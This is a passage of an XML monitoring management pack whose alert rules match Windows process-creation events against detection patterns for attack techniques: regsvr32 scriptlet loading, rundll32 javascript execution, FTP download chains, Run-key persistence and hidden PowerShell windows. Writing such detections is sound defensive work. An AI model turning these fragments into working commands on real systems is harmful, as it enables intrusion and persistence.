            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.4688.SuspiciousFTPCommand.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.4688.SuspiciousApplockerRegsvr" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>/s /n /u /i:</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>scrobj.dll</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>.sct</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.4688.SuspiciousApplockerRegsvr.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.4688.SuspiciousWindowsPosition" Enabled="true" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Security</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>WindowPosition</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>20132966</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>powershell</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.4688.SuspiciousWindowsPosition.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Credible Threats</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>cmd.exe /c cd c:\Progra~1&amp;for</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>cmd.exe /c cd c:\windows\debug&amp;for</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>cmd.exe /c cd C:\windows\Installer&amp;for</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>reg.exe</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>Add</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>\Run /v</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>bginfo</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v e2e /d c:\windows\System32\notepad.exe /f</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>\Prep\</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>C:\Program Files</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>DoesNotContainSubstring</Operator>
                    <Pattern>Yahoo Messenger</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>\\rundll32.exe</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>javascript</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>mshtml,RunHTMLApplication</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousFTPCommand" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>cmd.exe</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>echo open</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>echo get</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousFTPCommand.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerRegsvr" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>/s /n /u /i:</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <Or>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>scrobj.dll</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                        </ValueExpression>
                        <Operator>ContainsSubstring</Operator>
                        <Pattern>.sct</Pattern>
                      </RegExExpression>
                    </Expression>
                  </Or>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerRegsvr.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousWindowsPosition" Enabled="true" Target="WindowsEventCollectorDiscovery!WindowsEventCollectorDiscovery.EventLogCollectorServer" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>ForwardedEvents</LogName>
            <AllowProxying>true</AllowProxying>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">4688</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>WindowPosition</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[9]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>20132966</Pattern>
                  </RegExExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>powershell</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>2</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousWindowsPosition.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data/Params/Param[6]$</AlertParameter3>
              <AlertParameter4>$Data/Params/Param[9]$</AlertParameter4>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Forwarded Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.SoftwareInstallOnServer" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>Application</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">11707</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">PublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">MsiInstaller</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>1</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.SoftwareInstallOnServer.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data[Default='']/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression>
              <SuppressionValue>$Data/LoggingComputer$</SuppressionValue>
            </Suppression>
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.UnexpectedShutdown" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>System</LogName>
            <Expression>
              <SimpleExpression>
                <ValueExpression>
                  <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                </ValueExpression>
                <Operator>Equal</Operator>
                <ValueExpression>
                  <Value Type="UnsignedInteger">6008</Value>
                </ValueExpression>
              </SimpleExpression>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>1</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.UnexpectedShutdown.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data/LoggingComputer$</AlertParameter1>
              <AlertParameter2>$Data/UserName$</AlertParameter2>
              <AlertParameter3>$Data[Default='']/EventDescription$</AlertParameter3>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.SystemRestarted" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>System</LogName>
            <Expression>
              <And>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="UnsignedInteger">1074</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">PublisherName</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="String">User32</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
                <Expression>
                  <RegExExpression>
                    <ValueExpression>
                      <XPathQuery Type="String">Params/Param[5]</XPathQuery>
                    </ValueExpression>
                    <Operator>ContainsSubstring</Operator>
                    <Pattern>restart</Pattern>
                  </RegExExpression>
                </Expression>
              </And>
            </Expression>
          </DataSource>
        </DataSources>
        <WriteActions>
          <WriteAction ID="Alert" TypeID="Health!System.Health.GenerateAlert">
            <Priority>1</Priority>
            <Severity>1</Severity>
            <AlertName />
            <AlertDescription />
            <AlertOwner />
            <AlertMessageId>$MPElement[Name="SecurityMonitoringMP.Event.SystemRestarted.AlertMessage"]$</AlertMessageId>
            <AlertParameters>
              <AlertParameter1>$Data[Default='']/EventDescription$</AlertParameter1>
            </AlertParameters>
            <Suppression />
            <Custom1 />
            <Custom2 />
            <Custom3 />
            <Custom4 />
            <Custom5 />
            <Custom6 />
            <Custom7 />
            <Custom8 />
            <Custom9 />
            <Custom10>Security Monitoring Operational Events</Custom10>
          </WriteAction>
        </WriteActions>
      </Rule>
      <Rule ID="SecurityMonitoringMP.Event.SystemPoweredOff" Enabled="false" Target="Windows!Microsoft.Windows.Server.OperatingSystem" ConfirmDelivery="true" Remotable="true" Priority="Normal" DiscardLevel="100">
        <Category>Alert</Category>
        <DataSources>
          <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.EventProvider">
            <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
            <LogName>System</LogName>
